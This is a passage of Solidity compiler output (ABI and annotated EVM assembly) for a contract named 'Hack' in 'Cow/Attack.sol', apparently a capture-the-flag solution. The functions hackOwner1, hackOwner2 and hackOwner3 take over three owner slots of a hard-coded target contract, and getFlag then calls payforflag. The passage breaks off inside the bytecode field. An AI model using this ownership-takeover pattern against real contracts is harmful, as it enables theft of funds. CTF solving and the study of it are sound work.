{
	"Cow/Attack.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "getFlag",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hackOwner1",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hackOwner2",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hackOwner3",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Cow/Attack.sol\":499:1375  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"Cow/Attack.sol\":535:577  0xCab0569b20115BB05C694e01900DFd8b9d377430 */\n  0xcab0569b20115bb05c694e01900dfd8b9d377430\n    /* \"Cow/Attack.sol\":519:578  ICow cow = ICow(0xCab0569b20115BB05C694e01900DFd8b9d377430) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Cow/Attack.sol\":499:1375  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Cow/Attack.sol\":499:1375  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x22f76b0f\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x3f6f07e9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xaa8303a2\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xf9633930\n      eq\n      tag_5\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"Cow/Attack.sol\":1207:1373  function hackOwner3() public {... */\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"Cow/Attack.sol\":1011:1201  function hackOwner2() public payable {... */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"Cow/Attack.sol\":733:931  function hackOwner1() public payable {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"Cow/Attack.sol\":585:727  function getFlag() public payable {... */\n    tag_5:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n        /* \"Cow/Attack.sol\":1207:1373  function hackOwner3() public {... */\n    tag_8:\n        /* \"Cow/Attack.sol\":1246:1249  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1246:1253  cow.see */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9ae5a2be\n        /* \"Cow/Attack.sol\":1246:1255  cow.see() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"Cow/Attack.sol\":1294:1298  this */\n      address\n        /* \"Cow/Attack.sol\":1269:1299  cow.owner_3() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1269:1272  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1269:1280  cow.owner_3 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1a374399\n        /* \"Cow/Attack.sol\":1269:1282  cow.owner_3() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n        /* \"Cow/Attack.sol\":1269:1299  cow.owner_3() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Cow/Attack.sol\":1265:1367  if (cow.owner_3() != address(this)) {... */\n      tag_23\n      jumpi\n        /* \"Cow/Attack.sol\":1315:1356  revert(\"didn't hack owner3 successfully\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"Cow/Attack.sol\":1265:1367  if (cow.owner_3() != address(this)) {... */\n    tag_23:\n        /* \"Cow/Attack.sol\":1207:1373  function hackOwner3() public {... */\n      jump\t// out\n        /* \"Cow/Attack.sol\":1011:1201  function hackOwner2() public payable {... */\n    tag_10:\n        /* \"Cow/Attack.sol\":1058:1061  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1058:1065  cow.cov */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x96c50336\n        /* \"Cow/Attack.sol\":1073:1080  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Cow/Attack.sol\":1058:1083  cow.cov{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Cow/Attack.sol\":1122:1126  this */\n      address\n        /* \"Cow/Attack.sol\":1097:1127  cow.owner_2() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1097:1100  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":1097:1108  cow.owner_2 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1cee5d7a\n        /* \"Cow/Attack.sol\":1097:1110  cow.owner_2() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_32\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_32:\n        /* \"Cow/Attack.sol\":1097:1127  cow.owner_2() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Cow/Attack.sol\":1093:1195  if (cow.owner_2() != address(this)) {... */\n      tag_33\n      jumpi\n        /* \"Cow/Attack.sol\":1143:1184  revert(\"didn't hack owner2 successfully\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_34\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"Cow/Attack.sol\":1093:1195  if (cow.owner_2() != address(this)) {... */\n    tag_33:\n        /* \"Cow/Attack.sol\":1011:1201  function hackOwner2() public payable {... */\n      jump\t// out\n        /* \"Cow/Attack.sol\":733:931  function hackOwner1() public payable {... */\n    tag_12:\n        /* \"Cow/Attack.sol\":780:783  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":780:787  cow.Cow */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xff2eff94\n        /* \"Cow/Attack.sol\":795:802  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Cow/Attack.sol\":780:805  cow.Cow{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Cow/Attack.sol\":844:848  this */\n      address\n        /* \"Cow/Attack.sol\":819:849  cow.owner_1() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":819:822  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":819:830  cow.owner_1 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0d124c0\n        /* \"Cow/Attack.sol\":819:832  cow.owner_1() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_42\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_42:\n        /* \"Cow/Attack.sol\":819:849  cow.owner_1() != address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Cow/Attack.sol\":815:917  if (cow.owner_1() != address(this)) {... */\n      tag_43\n      jumpi\n        /* \"Cow/Attack.sol\":865:906  revert(\"didn't hack owner1 successfully\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_44\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"Cow/Attack.sol\":815:917  if (cow.owner_1() != address(this)) {... */\n    tag_43:\n        /* \"Cow/Attack.sol\":733:931  function hackOwner1() public payable {... */\n      jump\t// out\n        /* \"Cow/Attack.sol\":585:727  function getFlag() public payable {... */\n    tag_14:\n        /* \"Cow/Attack.sol\":629:641  hackOwner1() */\n      tag_47\n        /* \"Cow/Attack.sol\":629:639  hackOwner1 */\n      tag_12\n        /* \"Cow/Attack.sol\":629:641  hackOwner1() */\n      jump\t// in\n    tag_47:\n        /* \"Cow/Attack.sol\":651:663  hackOwner2() */\n      tag_48\n        /* \"Cow/Attack.sol\":651:661  hackOwner2 */\n      tag_10\n        /* \"Cow/Attack.sol\":651:663  hackOwner2() */\n      jump\t// in\n    tag_48:\n        /* \"Cow/Attack.sol\":673:685  hackOwner3() */\n      tag_49\n        /* \"Cow/Attack.sol\":673:683  hackOwner3 */\n      tag_8\n        /* \"Cow/Attack.sol\":673:685  hackOwner3() */\n      jump\t// in\n    tag_49:\n        /* \"Cow/Attack.sol\":695:698  cow */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Cow/Attack.sol\":695:709  cow.payforflag */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x6bc344bc\n        /* \"Cow/Attack.sol\":695:720  cow.payforflag(\"got it!\") */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_50\n      swap1\n      tag_51\n      jump\t// in\n    tag_50:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_52\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_52:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_54:\n      pop\n      pop\n      pop\n      pop\n        /* \"Cow/Attack.sol\":585:727  function getFlag() public payable {... */\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_56:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_58:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_59:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_77\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_58\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_60:\n        /* \"#utility.yul\":641:665   */\n      tag_79\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_59\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_80\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      dup1\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_80:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:839   */\n    tag_61:\n        /* \"#utility.yul\":753:758   */\n      0x00\n        /* \"#utility.yul\":784:790   */\n      dup2\n        /* \"#utility.yul\":778:791   */\n      mload\n        /* \"#utility.yul\":769:791   */\n      swap1\n      pop\n        /* \"#utility.yul\":800:833   */\n      tag_82\n        /* \"#utility.yul\":827:832   */\n      dup2\n        /* \"#utility.yul\":800:833   */\n      tag_60\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":696:839   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":845:1196   */\n    tag_22:\n        /* \"#utility.yul\":915:921   */\n      0x00\n        /* \"#utility.yul\":964:966   */\n      0x20\n        /* \"#utility.yul\":952:961   */\n      dup3\n        /* \"#utility.yul\":943:950   */\n      dup5\n        /* \"#utility.yul\":939:962   */\n      sub\n        /* \"#utility.yul\":935:967   */\n      slt\n        /* \"#utility.yul\":932:1051   */\n      iszero\n      tag_84\n      jumpi\n        /* \"#utility.yul\":970:1049   */\n      tag_85\n      tag_56\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":932:1051   */\n    tag_84:\n        /* \"#utility.yul\":1090:1091   */\n      0x00\n        /* \"#utility.yul\":1115:1179   */\n      tag_86\n        /* \"#utility.yul\":1171:1178   */\n      dup5\n        /* \"#utility.yul\":1162:1168   */\n      dup3\n        /* \"#utility.yul\":1151:1160   */\n      dup6\n        /* \"#utility.yul\":1147:1169   */\n      add\n        /* \"#utility.yul\":1115:1179   */\n      tag_61\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1105:1179   */\n      swap2\n      pop\n        /* \"#utility.yul\":1061:1189   */\n      pop\n        /* \"#utility.yul\":845:1196   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1202:1371   */\n    tag_62:\n        /* \"#utility.yul\":1286:1297   */\n      0x00\n        /* \"#utility.yul\":1320:1326   */\n      dup3\n        /* \"#utility.yul\":1315:1318   */\n      dup3\n        /* \"#utility.yul\":1308:1327   */\n      mstore\n        /* \"#utility.yul\":1360:1364   */\n      0x20\n        /* \"#utility.yul\":1355:1358   */\n      dup3\n        /* \"#utility.yul\":1351:1365   */\n      add\n        /* \"#utility.yul\":1336:1365   */\n      swap1\n      pop\n        /* \"#utility.yul\":1202:1371   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1377:1558   */\n    tag_63:\n        /* \"#utility.yul\":1517:1550   */\n      0x6469646e2774206861636b206f776e657233207375636365737366756c6c7900\n        /* \"#utility.yul\":1513:1514   */\n      0x00\n        /* \"#utility.yul\":1505:1511   */\n      dup3\n        /* \"#utility.yul\":1501:1515   */\n      add\n        /* \"#utility.yul\":1494:1551   */\n      mstore\n        /* \"#utility.yul\":1377:1558   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1564:1930   */\n    tag_64:\n        /* \"#utility.yul\":1706:1709   */\n      0x00\n        /* \"#utility.yul\":1727:1794   */\n      tag_90\n        /* \"#utility.yul\":1791:1793   */\n      0x1f\n        /* \"#utility.yul\":1786:1789   */\n      dup4\n        /* \"#utility.yul\":1727:1794   */\n      tag_62\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":1720:1794   */\n      swap2\n      pop\n        /* \"#utility.yul\":1803:1896   */\n      tag_91\n        /* \"#utility.yul\":1892:1895   */\n      dup3\n        /* \"#utility.yul\":1803:1896   */\n      tag_63\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1921:1923   */\n      0x20\n        /* \"#utility.yul\":1916:1919   */\n      dup3\n        /* \"#utility.yul\":1912:1924   */\n      add\n        /* \"#utility.yul\":1905:1924   */\n      swap1\n      pop\n        /* \"#utility.yul\":1564:1930   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1936:2355   */\n    tag_25:\n        /* \"#utility.yul\":2102:2106   */\n      0x00\n        /* \"#utility.yul\":2140:2142   */\n      0x20\n        /* \"#utility.yul\":2129:2138   */\n      dup3\n        /* \"#utility.yul\":2125:2143   */\n      add\n        /* \"#utility.yul\":2117:2143   */\n      swap1\n      pop\n        /* \"#utility.yul\":2189:2198   */\n      dup2\n        /* \"#utility.yul\":2183:2187   */\n      dup2\n        /* \"#utility.yul\":2179:2199   */\n      sub\n        /* \"#utility.yul\":2175:2176   */\n      0x00\n        /* \"#utility.yul\":2164:2173   */\n      dup4\n        /* \"#utility.yul\":2160:2177   */\n      add\n        /* \"#utility.yul\":2153:2200   */\n      mstore\n        /* \"#utility.yul\":2217:2348   */\n      tag_93\n        /* \"#utility.yul\":2343:2347   */\n      dup2\n        /* \"#utility.yul\":2217:2348   */\n      tag_64\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":2209:2348   */\n      swap1\n      pop\n        /* \"#utility.yul\":1936:2355   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2361:2542   */\n    tag_65:\n        /* \"#utility.yul\":2501:2534   */\n      0x6469646e2774206861636b206f776e657232207375636365737366756c6c7900\n        /* \"#utility.yul\":2497:2498   */\n      0x00\n        /* \"#utility.yul\":2489:2495   */\n      dup3\n        /* \"#utility.yul\":2485:2499   */\n      add\n        /* \"#utility.yul\":2478:2535   */\n      mstore\n        /* \"#utility.yul\":2361:2542   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2548:2914   */\n    tag_66:\n        /* \"#utility.yul\":2690:2693   */\n      0x00\n        /* \"#utility.yul\":2711:2778   */\n      tag_96\n        /* \"#utility.yul\":2775:2777   */\n      0x1f\n        /* \"#utility.yul\":2770:2773   */\n      dup4\n        /* \"#utility.yul\":2711:2778   */\n      tag_62\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2704:2778   */\n      swap2\n      pop\n        /* \"#utility.yul\":2787:2880   */\n      tag_97\n        /* \"#utility.yul\":2876:2879   */\n      dup3\n        /* \"#utility.yul\":2787:2880   */\n      tag_65\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":2905:2907   */\n      0x20\n        /* \"#utility.yul\":2900:2903   */\n      dup3\n        /* \"#utility.yul\":2896:2908   */\n      add\n        /* \"#utility.yul\":2889:2908   */\n      swap1\n      pop\n        /* \"#utility.yul\":2548:2914   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2920:3339   */\n    tag_35:\n        /* \"#utility.yul\":3086:3090   */\n      0x00\n        /* \"#utility.yul\":3124:3126   */\n      0x20\n        /* \"#utility.yul\":3113:3122   */\n      dup3\n        /* \"#utility.yul\":3109:3127   */\n      add\n        /* \"#utility.yul\":3101:3127   */\n      swap1\n      pop\n        /* \"#utility.yul\":3173:3182   */\n      dup2\n        /* \"#utility.yul\":3167:3171   */\n      dup2\n        /* \"#utility.yul\":3163:3183   */\n      sub\n        /* \"#utility.yul\":3159:3160   */\n      0x00\n        /* \"#utility.yul\":3148:3157   */\n      dup4\n        /* \"#utility.yul\":3144:3161   */\n      add\n        /* \"#utility.yul\":3137:3184   */\n      mstore\n        /* \"#utility.yul\":3201:3332   */\n      tag_99\n        /* \"#utility.yul\":3327:3331   */\n      dup2\n        /* \"#utility.yul\":3201:3332   */\n      tag_66\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3193:3332   */\n      swap1\n      pop\n        /* \"#utility.yul\":2920:3339   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3345:3526   */\n    tag_67:\n        /* \"#utility.yul\":3485:3518   */\n      0x6469646e2774206861636b206f776e657231207375636365737366756c6c7900\n        /* \"#utility.yul\":3481:3482   */\n      0x00\n        /* \"#utility.yul\":3473:3479   */\n      dup3\n        /* \"#utility.yul\":3469:3483   */\n      add\n        /* \"#utility.yul\":3462:3519   */\n      mstore\n        /* \"#utility.yul\":3345:3526   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3532:3898   */\n    tag_68:\n        /* \"#utility.yul\":3674:3677   */\n      0x00\n        /* \"#utility.yul\":3695:3762   */\n      tag_102\n        /* \"#utility.yul\":3759:3761   */\n      0x1f\n        /* \"#utility.yul\":3754:3757   */\n      dup4\n        /* \"#utility.yul\":3695:3762   */\n      tag_62\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":3688:3762   */\n      swap2\n      pop\n        /* \"#utility.yul\":3771:3864   */\n      tag_103\n        /* \"#utility.yul\":3860:3863   */\n      dup3\n        /* \"#utility.yul\":3771:3864   */\n      tag_67\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":3889:3891   */\n      0x20\n        /* \"#utility.yul\":3884:3887   */\n      dup3\n        /* \"#utility.yul\":3880:3892   */\n      add\n        /* \"#utility.yul\":3873:3892   */\n      swap1\n      pop\n        /* \"#utility.yul\":3532:3898   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3904:4323   */\n    tag_45:\n        /* \"#utility.yul\":4070:4074   */\n      0x00\n        /* \"#utility.yul\":4108:4110   */\n      0x20\n        /* \"#utility.yul\":4097:4106   */\n      dup3\n        /* \"#utility.yul\":4093:4111   */\n      add\n        /* \"#utility.yul\":4085:4111   */\n      swap1\n      pop\n        /* \"#utility.yul\":4157:4166   */\n      dup2\n        /* \"#utility.yul\":4151:4155   */\n      dup2\n        /* \"#utility.yul\":4147:4167   */\n      sub\n        /* \"#utility.yul\":4143:4144   */\n      0x00\n        /* \"#utility.yul\":4132:4141   */\n      dup4\n        /* \"#utility.yul\":4128:4145   */\n      add\n        /* \"#utility.yul\":4121:4168   */\n      mstore\n        /* \"#utility.yul\":4185:4316   */\n      tag_105\n        /* \"#utility.yul\":4311:4315   */\n      dup2\n        /* \"#utility.yul\":4185:4316   */\n      tag_68\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":4177:4316   */\n      swap1\n      pop\n        /* \"#utility.yul\":3904:4323   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4329:4486   */\n    tag_69:\n        /* \"#utility.yul\":4469:4478   */\n      0x676f742069742100000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4465:4466   */\n      0x00\n        /* \"#utility.yul\":4457:4463   */\n      dup3\n        /* \"#utility.yul\":4453:4467   */\n      add\n        /* \"#utility.yul\":4446:4479   */\n      mstore\n        /* \"#utility.yul\":4329:4486   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4492:4857   */\n    tag_70:\n        /* \"#utility.yul\":4634:4637   */\n      0x00\n        /* \"#utility.yul\":4655:4721   */\n      tag_108\n        /* \"#utility.yul\":4719:4720   */\n      0x07\n        /* \"#utility.yul\":4714:4717   */\n      dup4\n        /* \"#utility.yul\":4655:4721   */\n      tag_62\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":4648:4721   */\n      swap2\n      pop\n        /* \"#utility.yul\":4730:4823   */\n      tag_109\n        /* \"#utility.yul\":4819:4822   */\n      dup3\n        /* \"#utility.yul\":4730:4823   */\n      tag_69\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":4848:4850   */\n      0x20\n        /* \"#utility.yul\":4843:4846   */\n      dup3\n        /* \"#utility.yul\":4839:4851   */\n      add\n        /* \"#utility.yul\":4832:4851   */\n      swap1\n      pop\n        /* \"#utility.yul\":4492:4857   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4863:5282   */\n    tag_51:\n        /* \"#utility.yul\":5029:5033   */\n      0x00\n        /* \"#utility.yul\":5067:5069   */\n      0x20\n        /* \"#utility.yul\":5056:5065   */\n      dup3\n        /* \"#utility.yul\":5052:5070   */\n      add\n        /* \"#utility.yul\":5044:5070   */\n      swap1\n      pop\n        /* \"#utility.yul\":5116:5125   */\n      dup2\n        /* \"#utility.yul\":5110:5114   */\n      dup2\n        /* \"#utility.yul\":5106:5126   */\n      sub\n        /* \"#utility.yul\":5102:5103   */\n      0x00\n        /* \"#utility.yul\":5091:5100   */\n      dup4\n        /* \"#utility.yul\":5087:5104   */\n      add\n        /* \"#utility.yul\":5080:5127   */\n      mstore\n        /* \"#utility.yul\":5144:5275   */\n      tag_111\n        /* \"#utility.yul\":5270:5274   */\n      dup2\n        /* \"#utility.yul\":5144:5275   */\n      tag_70\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":5136:5275   */\n      swap1\n      pop\n        /* \"#utility.yul\":4863:5282   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220fede1c7ef1549d7657de4078cdddaceafda07b8883955202dfbba4df3bd2b51664736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
